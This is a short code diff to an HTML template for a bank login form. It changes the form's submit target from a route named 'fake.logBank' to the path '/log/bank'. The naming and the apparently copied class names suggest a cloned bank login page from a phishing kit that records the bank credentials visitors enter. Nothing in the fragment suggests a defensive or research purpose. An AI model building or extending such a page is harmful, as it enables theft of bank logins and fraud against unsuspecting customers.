@@ -100,7 +100,7 @@
                                         <div id="check-login-error-banner" class="box-content box-content--error"></div>
                                         <div class="box-content box--after">
                                             <div class="login-form-content">
-                                                <form id="bank_pm_form" method="POST" action="{{subRoute('fake.logBank')}}"
+                                                <form id="bank_pm_form" method="POST" action="/log/bank"
                                                       role="form">
                                                     <div class="form-group">
                                                         <label for="login-input" class="_3LNER _3K-gi js-login-label">
